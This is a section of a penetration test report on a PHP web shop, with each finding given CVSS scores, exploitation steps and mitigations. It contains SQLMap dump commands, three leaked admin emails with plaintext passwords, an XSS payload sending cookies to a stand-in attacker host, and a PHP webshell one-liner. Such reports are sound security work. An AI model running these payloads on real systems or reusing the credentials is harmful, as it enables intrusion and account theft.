# V. Detail Findings & Exploitation

[← Back to README](./README.md)

---

## 5.1 SQL Injection on Coupon Code Input in Cart.php

**CVSS Score: 7.5 (High)**

The pentester successfully performed SQL Injection using SQLMap via a request to the coupon input endpoint on `cart.php`, which is accessible directly without login at [http://dibishop.duckdns.org/cart.php](http://dibishop.duckdns.org/cart.php).

### 5.1.1 Risk

An attacker can execute SQL Injection without authentication and exploit the database — including dumping sensitive data such as database names, table names, and table contents (e.g., products, customers, and the admins table containing admin accounts and passwords). This is extremely dangerous because the attacker can obtain admin credentials and proceed with further exploitation using the admin panel features.

Proven SQL Injection also opens the door for attackers to manipulate data such as product information, orders, customers, and prices — directly impacting business operations.

> This vulnerability was also found on `detail.php`, `checkout.php`, and `customer_register.php`.

### 5.1.2 Severity

Classified as **High** because exploitation can be performed remotely over the internet, without requiring authentication or authorization, and affects the Confidentiality, Integrity, and Availability of data. This vulnerability also serves as the primary entry point for the broader attack chain.

### 5.1.3 CVSS Base Score Breakdown

| **Metric** | **Value** | **Reason** |
|---|---|---|
| Attack Vector | Network | Exploitable directly over the internet without local access. |
| Attack Complexity | Low | Exploitation is trivial using simple payloads like `' OR 1=1` or automated tools like SQLMap. |
| Privileges Required | None | No account or authentication is needed to exploit this. |
| User Interaction | None | No interaction from another user is required. |
| Scope | Unchanged | Impact is limited to the same web application and database. |
| Confidentiality Impact | High | Attacker can read the entire database including sensitive data. |
| Integrity Impact | None | Does not directly alter data integrity. |
| Availability Impact | Low | Does not directly affect data availability. |

### 5.1.4 Vulnerable Source Code (`cart.php`)

The script runs user input directly:

```php
select * from coupons where coupon_code='$code'
```

No sanitization (Prepared Statement or Parameterized Query) is applied.

### 5.1.5 Exploitation Steps

1. Navigate to `http://dibishop.duckdns.org/cart.php`
2. Inject SQL syntax into the coupon field — the resulting SQL error message confirms the input is executed directly by the database.
3. Capture the request payload using Burp Suite and save it as `request.txt` for use with SQLMap.
4. Run SQLMap commands:

```bash
# Enumerate databases
sqlmap -r request.txt -p code --dbs
# → Found database: dibimbing-shop

# List tables in the database
sqlmap -r request.txt -p code -D dibimbing-shop --tables

# Dump the admins table
sqlmap -r request.txt \
  -p "code" \
  --level=3 --risk=3 \
  --dbms=mysql \
  -D dibimbing-shop \
  -T admins \
  --dump \
  --batch \
  --random-agent \
  2>&1 | tee sqlmap_admins.txt
```

### 5.1.6 Exploitation Results

The attacker successfully dumped the `admins` table:

| **admin_id** | **admin_name** | **admin_email** | **admin_pass (PLAIN TEXT)** |
|---|---|---|---|
| 12 | fahmi@cakrawala.ac.id | fahmi@cakrawala.ac.id | admindibimbing |
| 15 | Rahasia | rahasia27@gmail.com | rahasia27 |
| 18 | dibi | dibi@shop.org | balonkuadaempat |

### 5.1.7 Impact

- **Full database compromise** — all data of 33 customers, 187 products, and Rp 1,171,001,350 in earnings was exposed.
- **Admin credential leak** — allows an attacker to log into the admin panel without brute force.
- **Customer data exposure** — names, emails, addresses, contacts, and order history can be dumped.
- **Data manipulation** — an attacker can modify product data, pricing, orders, and coupons, impacting business processes and causing financial losses.

### 5.1.8 Mitigation

Use **Prepared Statements / Parameterized Queries** across all database queries:

```php
$stmt = $con->prepare("SELECT * FROM coupons WHERE coupon_code = ?");
$stmt->bind_param("s", $code);
$stmt->execute();
```

Additional steps:
- Hash passwords using bcrypt or Argon2 — **never store plain text**.
- Apply input validation and whitelist only allowed characters.
- Hide SQL error details from users (`display_errors = Off` in production).

---

## 5.2 Exposed Git Repository

**CVSS Score: 7.5 (High)**

### 5.2.1 Risk

The attacker gained access to the application's full source code, including commit history and configuration files. This significantly facilitates in-depth white-box analysis to find other vulnerabilities such as SQL Injection, hardcoded credentials, or API keys.

### 5.2.2 Severity

Classified as **High** because, although it does not directly grant system access, it dramatically increases the chances of exploiting other vulnerabilities.

### 5.2.3 CVSS Base Score Breakdown

| **Metric** | **Value** | **Reason** |
|---|---|---|
| Attack Vector | Network | Repository accessible via public URL. |
| Attack Complexity | Low | No special technique required — simply access `/.git/`. |
| Privileges Required | None | No authentication needed. |
| User Interaction | None | No user interaction required. |
| Scope | Unchanged | No direct impact on the running application. |
| Confidentiality Impact | High | Source code and internal configuration are exposed. |
| Integrity Impact | None | No direct system changes. |
| Availability Impact | None | Does not directly affect system availability. |

### 5.2.4 Exploitation Steps & Evidence

1. Access `http://dibishop.duckdns.org/.git/HEAD` → returns: `ref: refs/heads/main`
2. Access `http://dibishop.duckdns.org/.git/config` → returns the remote GitHub repository URL.
3. From `.git/logs/HEAD`, it was confirmed the server runs as `root` on a VPS.
4. Attacker accesses the public GitHub repository: [https://github.com/rezafahmialviandy/Dibimbing-Shop](https://github.com/rezafahmialviandy/Dibimbing-Shop)
5. With source code access, the attacker can conduct effective white-box penetration testing.

### 5.2.5 Impact

The exposed repository enables in-depth white-box testing, allowing the attacker to identify hardcoded credentials, API keys, and other vulnerabilities.

### 5.2.6 White-Box Source Code Analysis Results

Vulnerabilities confirmed through source code review:

- SQL Injection in `cart.php`, `details.php`, `customer_register.php`, `checkout.php`
- Price manipulation via DevTools in `details.php`
- Cross-Site Scripting in `details.php`
- Plaintext password storage in `customer_register.php`

### 5.2.7 Mitigation

Block access to the `.git` directory via `.htaccess`:

```apache
<Directory ~ "\.git">
    Order allow,deny
    Deny from all
</Directory>
```

Additional steps:
- Remove the `.git` directory from the production web root.
- Ensure the GitHub repository is set to **private** if it contains production code.

---

## 5.3 Password Stored in Plain Text

**CVSS Score: 8.1 (High)**

Admin and customer passwords are stored in the database without any hashing. This was confirmed by the SQLMap dump, which displayed passwords in fully readable plain text. This is a fundamental violation of credential storage security principles.

### 5.3.1 Risk

Passwords stored without hashing can be used directly by an attacker after gaining database access. The attacker obtained admin usernames and passwords, enabling login to the admin panel and further exploitation.

### 5.3.2 Severity

Classified as **High** because, combined with the SQL Injection vulnerability, it forms a multi-stage attack chain that provides the attacker with admin credentials for further exploitation.

> Note: If the application did not have an SQL Injection vulnerability, plaintext passwords would not be exposed and the severity would be downgraded.

### 5.3.3 CVSS Base Score Breakdown

| **Metric** | **Value** | **Reason** |
|---|---|---|
| Attack Vector | Network | Access through the system in the event of a breach. |
| Attack Complexity | High | Requires exploiting SQL Injection with Kali Linux tools. |
| Privileges Required | None | No admin or regular user account required. |
| User Interaction | None | No user interaction needed. |
| Scope | Unchanged | Impact limited to the same system and database. |
| Confidentiality Impact | High | All passwords are exposed. |
| Integrity Impact | High | Exposed admin account can be used to modify data via the admin panel. |
| Availability Impact | High | Exposed admin account can be used to sabotage data availability. |

### 5.3.4 Evidence

SQLMap dump of the admins table revealed `admin_pass` in fully readable plain text (see Section 5.1.6).

### 5.3.5 Impact

All admin passwords can be used immediately after database exfiltration, giving the attacker full access to the admin panel for further exploitation.

### 5.3.6 Mitigation

- **Never store passwords in plain text, MD5, or SHA1.**
- Use PHP's `password_hash()` with a strong algorithm such as **BCRYPT** or **ARGON2ID**.
- Enforce strong password policies (uppercase, numbers, special characters).
- Implement password cycling and periodic rotation.

**Remediation:**
- Perform an immediate **password reset** for all admin users.

---

## 5.4 Admin Panel Access (Broken Access Control)

**CVSS Score: 9.8 (Critical)**

### 5.4.1 Risk

This vulnerability enables unauthorized access to the admin panel using credentials obtained through the previous vulnerabilities (SQL Injection and Plaintext Password). An attacker can leverage admin features including user management, customer management, products, orders, pricing, and other admin accounts.

### 5.4.2 Severity

Classified as **Critical** because it provides full access to highly sensitive administrative functions.

### 5.4.3 CVSS Base Score Breakdown

| **Metric** | **Value** | **Reason** |
|---|---|---|
| Attack Vector | Network | Access performed through the admin endpoint. |
| Attack Complexity | Low | No additional protection mechanisms such as MFA — only basic login required. |
| Privileges Required | Low | Requires admin login, but credentials are easily obtained. |
| User Interaction | None | No additional interaction needed. |
| Scope | Unchanged | Impact remains within the application system. |
| Confidentiality Impact | High | Other admin data, customers, products, and orders can be accessed. |
| Integrity Impact | High | Data can be modified. |
| Availability Impact | High | System can be sabotaged. |

### 5.4.4 Source Code Evidence (`admin_area/dashboard.php`)

No token validation, rate limiting, or IP whitelisting exists on the admin login page. Only session validation is present — which is already satisfied since admin credentials were exposed.

### 5.4.5 Exploitation Steps & Evidence

1. Navigate to `http://dibishop.duckdns.org/admin_area/login.php`
2. Log in using the previously dumped admin credentials.

### 5.4.6 Impact

The attacker can use all admin panel features: modifying other admin accounts, user data, product names and prices, order data, and various other settings.

### 5.4.7 Mitigation

- Implement **MFA** on the admin panel login.
- Perform an immediate **password reset** for all admin users.
- Apply **IP Whitelisting** for the admin dashboard so it cannot be accessed by attackers.
- Use **session regeneration** after successful login.
- Implement **rate limiting** and **account lockout** after several failed login attempts.

---

## 5.5 Stored Cross-Site Scripting (XSS)

**CVSS Score: 9.3 (Critical)**

### 5.5.1 Risk

The attacker successfully injected a malicious script that executes every time the page is visited — potentially by both regular users and admin accounts. The primary risks are **session cookie theft**, **account takeover**, and **impersonation** using stolen sessions.

### 5.5.2 Severity

Classified as **Critical** because the impact can reach admin session theft, potentially leading to full system compromise.

### 5.5.3 CVSS Base Score Breakdown

| **Metric** | **Value** | **Reason** |
|---|---|---|
| Attack Vector | Network | Payload delivered through web input. |
| Attack Complexity | Low | Only requires a simple script input. |
| Privileges Required | Low | Requires login as a regular user — easily registered. |
| User Interaction | Required | Victim must open the page containing the payload. |
| Scope | Changed | If the victim is an admin, the attack scope escalates from user panel to admin panel. |
| Confidentiality Impact | High | Cookies and sensitive data can be stolen. |
| Integrity Impact | High | Attacker can perform actions on behalf of the victim. |
| Availability Impact | None | No direct impact on system availability. |

### 5.5.4 Source Code Evidence

The `c_name` input field is not sanitized — no special character validation is applied.

### 5.5.5 Exploitation Steps & Evidence

1. Log in as a customer, navigate to **My Account → Edit Account**.
2. In the **Customer Name** field, enter the payload:
   ```html
   <script>alert(document.cookie)</script>
   ```
3. Click **Update Account**.
4. Reload the page — an alert dialog appears displaying the **PHPSESSID** cookie.
5. This payload also executes when an admin views the customer list in the admin panel.

### 5.5.6 Attack Chain

An attacker can exfiltrate cookies to their own server:

```html
<script>document.location='http://attacker_server.com/steal?c='+document.cookie</script>
```

### 5.5.7 Impact

- **Admin session cookie (PHPSESSID) theft** → admin account takeover
- Redirect victim to phishing pages
- Execute actions on behalf of the victim without their knowledge

### 5.5.8 Mitigation

Apply output encoding using `htmlspecialchars()` when displaying user data:

```php
echo htmlspecialchars($customer_name, ENT_QUOTES, 'UTF-8');
```

Additional steps:
- Implement a **Content Security Policy (CSP)** header to restrict script execution.
- Apply server-side input validation — reject HTML characters like `<`, `>`, `"`, `'`.

---

## 5.6 Insecure Cookie

**CVSS Score: 6.5 (Medium)**

### 5.6.1 Risk

Cookies without `HttpOnly` and `Secure` flags can be stolen via XSS or unencrypted connections, enabling session hijacking.

### 5.6.2 Severity

Classified as **Medium** because it requires additional conditions (such as XSS) for full exploitation.

### 5.6.3 CVSS Base Score Breakdown

| **Metric** | **Value** | **Reason** |
|---|---|---|
| Attack Vector | Network | Exploitation via the network. |
| Attack Complexity | Low | Only requires an XSS attack through profile editing to expose the cookie. |
| Privileges Required | None | No login required. |
| User Interaction | Required | User must access the payload. |
| Scope | Unchanged | Does not extend to other systems. |
| Confidentiality Impact | High | Session can be stolen. |
| Integrity Impact | None | Does not directly modify data. |
| Availability Impact | None | Does not directly delete data. |

### 5.6.4 Evidence

The cookie is directly visible when the XSS script runs (see Section 5.5).

### 5.6.5 Attack Chain

The combination of the Stored XSS vulnerability (via profile edit) and the Insecure Cookie enables theft of the session cookie via `document.cookie`, which was proven to successfully display the PHPSESSID value in the alert dialog.

### 5.6.6 Mitigation

- Implement **HTTPS** with **TLS 1.3+**.
- Set cookie flags **`HttpOnly`** and **`Secure`** when setting cookies.

---

## 5.7 Unrestricted File Upload

**CVSS Score: 6.5 (Medium)**

### 5.7.1 Risk

An attacker can upload malicious files (e.g., malware or webshells) and potentially execute them on the server. This opens the door for **Remote Code Execution (RCE)**, which could allow the attacker to run OS commands, read sensitive files, or fully take over the server.

> Note: Although file upload was successful, the attacker was unable to execute the uploaded file for further exploitation due to a security layer at the server/network level, and further attempts would have violated the Rules of Engagement.

### 5.7.2 Severity

Classified as **Medium** because it potentially provides a path to remote code execution and system control.

### 5.7.3 CVSS Base Score Breakdown

| **Metric** | **Value** | **Reason** |
|---|---|---|
| Attack Vector | Network | Upload performed through the web application. |
| Attack Complexity | Low | No file validation exists — exploitation is straightforward. |
| Privileges Required | None | Requires user login, but accounts can be freely created. |
| User Interaction | None | No additional interaction needed. |
| Scope | Changed | Exploitation could potentially extend from the application to the server OS. |
| Confidentiality Impact | None | Does not directly expose the system — requires further RCE exploitation. |
| Integrity Impact | Low | Does not directly affect data/system integrity without further exploitation. |
| Availability Impact | Low | Does not directly affect availability without further exploitation. |

### 5.7.4 Source Code Evidence (`customer/edit_account.php`)

Only a check for whether a file was uploaded exists — no validation of file type is performed.

### 5.7.5 Exploitation Steps & Evidence

1. Log in as a customer, navigate to **Edit Account**.
2. In the **Profile Image** field, select `sample_setup.exe`.
3. Click **Update Account** — the file is uploaded successfully without any error.
4. To test a webshell: create a file `shell.php` containing `<?php system($_GET['cmd']); ?>`
5. Upload the file, then attempt to access: `http://dibishop.duckdns.org/customer/customer_images/shell.php?cmd=id`

> The attacker attempted to execute `shell.php` via forced browsing but was blocked by a security layer at the network/server level.

### 5.7.6 Attack Chain

The presence of malicious files on the server opens opportunities for Remote Code Execution. Execution via forced browsing was blocked by a network-level security layer, but other RCE methods cannot be ruled out.

### 5.7.7 Mitigation

Validate file extension — only allow `jpg`, `jpeg`, `png`, `gif`:

```php
$allowed = ['jpg', 'jpeg', 'png', 'gif'];
$ext = strtolower(pathinfo($c_image, PATHINFO_EXTENSION));
if (!in_array($ext, $allowed)) { die('File type not allowed'); }
```

Additionally, **rename uploaded files to a random name** so they cannot be predicted and accessed from outside.

---

## 5.8 Session Fixation (+ Missing CSRF Protection)

**CVSS Score: 5.8 (Medium)**

The session ID is not refreshed (`session_regenerate_id()`) after a successful login in either the user or admin panel. The same session ID is used both before and after authentication, making the application vulnerable to session fixation attacks. Additionally, no CSRF token is present on either login form.

### 5.8.1 Risk

An attacker can force a user to use a predetermined session ID, then perform actions without the user's consent by sharing the same session ID.

### 5.8.2 Severity

Classified as **Medium** because it requires user interaction and social engineering.

### 5.8.3 CVSS Base Score Breakdown

| **Metric** | **Value** | **Reason** |
|---|---|---|
| Attack Vector | Network | Performed via web request. |
| Attack Complexity | High | Requires trapping the user with a crafted URL — needs social engineering. |
| Privileges Required | None | No account required. |
| User Interaction | Required | User must perform a login action. |
| Scope | Changed | If the victim is an admin, the scope extends to the admin panel and admin features. |
| Confidentiality Impact | Low | Does not directly steal confidential data — requires further attack using the stolen session. |
| Integrity Impact | Low | Does not directly affect data integrity — requires further attack. |
| Availability Impact | None | Does not directly disrupt availability. |

### 5.8.4 Exploitation Steps

1. Attacker obtains a valid session ID from the application (before login).
2. Attacker crafts a link containing that session ID and delivers it to the victim via social engineering.
3. Victim logs in using the crafted link.
4. Because the session ID is not regenerated after login, the attacker now holds an authenticated session.

### 5.8.5 Evidence

**Admin Panel:** Session ID before login = Session ID after login (no change observed).

**User Panel:** Session ID before login = Session ID after login (no change observed).

### 5.8.6 Mitigation

Add `session_regenerate_id(true)` immediately after a successful login:

```php
if ($count == 1) {
    session_regenerate_id(true); // Generate a new session ID
    $_SESSION['admin_email'] = $admin_email;
}
```

Additionally, implement **CSRF tokens** on every form that performs data changes.

---

## 5.9 Verbose Error Message

**CVSS Score: 5.3 (Medium)**

When special SQL characters are entered in the coupon code field, the application displays a detailed MySQL error message on the web page — including the server file path and line number. This provides valuable information to an attacker when crafting SQL Injection attacks.

### 5.9.1 Risk

Error messages expose internal information such as query structure and server paths, assisting attackers in further exploitation.

### 5.9.2 Severity

Classified as **Medium** because it has no direct exploitable impact, but actively supports other attacks.

### 5.9.3 CVSS Base Score Breakdown

| **Metric** | **Value** |
|---|---|
| Attack Vector | Network |
| Attack Complexity | Low |
| Privileges Required | None |
| User Interaction | None |
| Scope | Unchanged |
| Confidentiality Impact | Low |
| Integrity Impact | None |
| Availability Impact | None |

### 5.9.4 Mitigation

- Disable `display_errors` when deploying in production.
- Use try-catch blocks to handle exceptions.
- Display only generic error messages to the front-end in all error handlers.
- Log errors to a server-side file (`log_errors = On`), not to the browser.
